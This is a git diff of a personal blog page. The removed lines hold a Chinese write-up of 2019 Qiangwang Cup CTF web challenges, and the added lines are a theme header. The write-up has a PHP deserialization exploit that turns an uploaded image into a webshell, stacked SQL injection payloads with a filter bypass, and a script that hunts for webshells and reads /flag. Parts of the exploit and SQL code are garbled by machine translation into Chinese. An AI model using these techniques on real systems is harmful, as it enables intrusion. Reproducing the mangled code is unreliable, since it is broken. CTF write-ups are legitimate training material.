@@ -1,361 +1,563 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="0x01上传Docker环境：https：&#x2F;&#x2F;github.com&#x2F;CTFTraining&#x2F;qwb_2019_upload刚开始正常上传图片，可以得到图片马路径，但是文件后缀被修改且没有文件包含点。通过dirsearch扫到网站源码。 拿到源码首先需要查看配置文件和路由，看了一眼配置文件，cache.php无缓存文件功能，不能写入一句话木马读取。  查看TP5 &#x2F;路由&#x2F; route.php路由功能">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2019强网杯web部分题解">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="0x01上传Docker环境：https：&#x2F;&#x2F;github.com&#x2F;CTFTraining&#x2F;qwb_2019_upload刚开始正常上传图片，可以得到图片马路径，但是文件后缀被修改且没有文件包含点。通过dirsearch扫到网站源码。 拿到源码首先需要查看配置文件和路由，看了一眼配置文件，cache.php无缓存文件功能，不能写入一句话木马读取。  查看TP5 &#x2F;路由&#x2F; route.php路由功能">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/2.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/3.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/4.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/5.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/6.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/7.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/8.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/9.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/10.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/11.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/12.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/13.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/14.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/15.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/16.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/17.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/18.png">
-<meta property="article:published_time" content="2019-05-28T13:27:54.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:25:04.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>2019强网杯web部分题解</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>2019强网杯web部分题解 - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/06/02/RIPS-2-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&text=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&is_video=false&description=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=2019强网杯web部分题解&body=Check out this article: http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&name=2019强网杯web部分题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&t=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01上传"><span class="toc-number">1.</span> <span class="toc-text">0x01上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击链"><span class="toc-number">1.1.</span> <span class="toc-text">攻击链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02随便注"><span class="toc-number">2.</span> <span class="toc-text">0x02随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#高明的黑客"><span class="toc-number">3.</span> <span class="toc-text">高明的黑客</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        2019强网杯web部分题解
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-05-28T13:27:54.000Z" itemprop="datePublished">2019-05-28</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
-
-      <span id="/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="leancloud_visitors" data-flag-title="2019强网杯web部分题解">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="0x01上传"><a href="#0x01上传" class="headerlink" title="0x01上传"></a>0x01上传</h1><p>Docker环境：https：//github.com/CTFTraining/qwb_2019_upload<br><img src="./1.png" alt=""><br>刚开始正常上传图片，可以得到图片马路径，但是文件后缀被修改且没有文件包含点。<br>通过dirsearch扫到网站源码。<br><img src="./2.png" alt=""></p>
-<p>拿到源码首先需要查看配置文件和路由<br>，看了一眼配置文件，cache.php无缓存文件功能，不能写入一句话木马读取。</p>
-<p><img src="./3.png" alt=""></p>
-<p>查看TP5 /路由/ route.php路由功能文件，分析URL访问时控制类调用情况。<br><img src="./4.png" alt=""></p>
-<p>Thinkphp5框架是最新版，没有找到漏洞。遂跟进网站应用控制类下。</p>
-<p>TP5 /应用/网页/控制器/ index.php的第37行<br>$profile通过cookie传入，存在任意类反序列化操作<br><img src="./5.png" alt=""></p>
-<p>搜索有可以利用的函数，发现TP5 /应用/网页/控制器/ Profile.php第43行<br>存在文件重名操作copy</p>
-<p><img src="./6.png" alt=""><br>在profile.php下文件存在<strong>get()、</strong>call()魔术方法可以利用。<br><strong>call()通过类调用不存在方法而触发。通过可以</strong>get()向$this-&gt;{$name}传入upload_img方法，进行upload_img()方法二次调用，执行文件名重写。</p>
-<p><img src="./7.png" alt=""></p>
-<p>在TP5 /应用/网页/控制器/ Register.php第58行，发现析构函数，检查为类变量可控。通过类轮廓调用不存在的索引（）方法即可触发轮廓类下的__call魔术方法。</p>
-<p><img src="./8.png" alt=""><br>编写EXP</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php </span><br><span class="line">namespace app \ web \ controller; </span><br><span class="line">使用think \ Controller; </span><br><span class="line">&#x2F;&#x2F;先传入带有shell的图片马，然后将生成的cookie替换当前用户字段，重新加载界面，就可以执行木马。路径可以在传入图片之后网页源码找到</span><br><span class="line">.class Register &#123; </span><br><span class="line">    public $ checker; </span><br><span class="line">    public $ registed &#x3D; false; </span><br><span class="line">    public function __construct（$ checker）</span><br><span class="line">    &#123; </span><br><span class="line">        $ this-&gt; checker &#x3D; $ checker; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">类档案&#123; </span><br><span class="line">    公共$ filename_tmp &#x3D; “.&#x2F;上传&#x2F; 122c4a55d1a70cef972cac3982dd49a6 &#x2F; f3ccdd27d2000e3f9255a7e3e2c48800.png”; </span><br><span class="line">    public $ filename &#x3D;“.&#x2F; upload &#x2F; 122c4a55d1a70cef972cac3982dd49a6 &#x2F; shell.php”; </span><br><span class="line">    public $ ext &#x3D; true; </span><br><span class="line">    public $ except &#x3D; array（&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;）; </span><br><span class="line">&#125; </span><br><span class="line">$ a &#x3D; new Register（new Profile（））;</span><br><span class="line">印刷（用urlencode（BASE64_ENCODE（连载（$ A））））;</span><br></pre></td></tr></table></figure>
-
-<p><img src="./9.png" alt=""></p>
-<h2 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h2><p><img src="./10.png" alt=""></p>
-<h1 id="0x02随便注"><a href="#0x02随便注" class="headerlink" title="0x02随便注"></a>0x02随便注</h1><p>Docker：https：//github.com/CTFTraining/qwb_2019_supersqli<br>尝试Sql注入弹出如下过滤情况<br><img src="./11.png" alt=""><br>发现存在堆叠注入<br><code>1’;show tables;#</code><br><img src="./12.png" alt=""></p>
-<p>使用预编译语句插入查询语句<br>参考官方链接:(编写的SQL语句语法）[ <a href="https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html]" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html]</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置@sql &#x3D; concat（&#39;sel&#39;，&#39;ect * from&#39;1919810931114514&#96;&#39;）; </span><br><span class="line">从@sql准备presql; </span><br><span class="line">执行presql; </span><br><span class="line">deallocate准备presql;</span><br></pre></td></tr></table></figure>
-<p><img src="./13.png" alt=""></p>
-<p>使用strstr过滤set、prepare。大小写绕过即可<br><img src="./14.png" alt=""></p>
-<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>Docker：https：//github.com/CTFTraining/qwb_2019_smarthacker</p>
-<p><img src="./15.png" alt=""><br>拉下网页源码，发现存在shell语句但无法判断哪个是真正的Shell<br><img src="./16.png" alt=""><br>类似有assert、eval、system相关函数<br>编写脚本批量查shell<br><img src="./17.png" alt=""><br><a href="http://127.0.0.1:8304/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://127.0.0.1:8304/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a><br><img src="./18.png" alt=""></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re,requests</span><br><span class="line"></span><br><span class="line">filename=os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern=re.compile(<span class="string">r"\$_[GETPOS]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line">j=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    q=j+<span class="number">1</span></span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+i,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=f.read()</span><br><span class="line">    reqname=list(set(pattern.findall(data)))</span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> reqname:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command=<span class="string">'uname'</span></span><br><span class="line">            flag=<span class="string">'Linux'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                parm=re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                url=<span class="string">"http://127.0.0.1:8304/"</span>+i</span><br><span class="line">                params=&#123;parm:command&#125;</span><br><span class="line">                r=requests.get(url=url,params=params)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'webshell filename is: '</span>+i)</span><br><span class="line">                    print(<span class="string">'GET_name: '</span>+parm)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                parm=re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                url=<span class="string">"http://127.0.0.1:8304/"</span>+i</span><br><span class="line">                data=&#123;parm:command&#125;</span><br><span class="line">                r=requests.post(url=url,data=data)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'webshell filename is: '</span>+i)</span><br><span class="line">                    print(<span class="string">'POST_name: '</span>+parm)</span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-  </div>
-</article>
-
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
+  
 
 
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
         
       </ul>
     </div>
+  </div>
+</nav>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01上传"><span class="toc-number">1.</span> <span class="toc-text">0x01上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击链"><span class="toc-number">1.1.</span> <span class="toc-text">攻击链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02随便注"><span class="toc-number">2.</span> <span class="toc-text">0x02随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#高明的黑客"><span class="toc-number">3.</span> <span class="toc-text">高明的黑客</span></a></li></ol>
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-05-28 21:27" pubdate>
+        2019年5月28日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      771 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      10
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
     </div>
+  </header>
 
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&text=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
